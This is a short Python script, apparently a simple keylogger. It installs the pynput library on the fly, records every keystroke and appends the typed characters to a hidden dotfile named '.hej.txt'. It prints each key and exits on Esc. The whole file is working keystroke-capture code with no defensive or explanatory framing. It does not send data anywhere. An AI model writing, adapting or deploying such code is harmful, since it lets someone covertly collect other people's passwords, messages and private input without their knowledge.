import sys
import subprocess
# implement pip as a subprocess:
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
'pynput'])

from pynput.keyboard import Key, Listener

count = 0
tangs = []


#If pressed
def on_tryck(tang):
    global tangs, count
    tangs.append(tang)
    count += 1
    #Optional
    print("{0} pressed".format(tang))

    if count >= 10:
        count = 0
        write_file(tangs)
        tangs = []


#Write input to file

def write_file(tangs):
    #Change to w-flag for new file
    with open(".hej.txt", "a") as f:
        for tang in tangs:
            k = str(tang).replace("'","")
            #If space/enter key, make more usable
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write('\n')
            #If unknown
            elif k.find("Key") == -1:
                f.write(k)

#Exit
def on_slapp(tang):
    if tang == Key.esc:
        return False

with Listener(on_press=on_tryck, on_release=on_slapp) as listener:
    listener.join()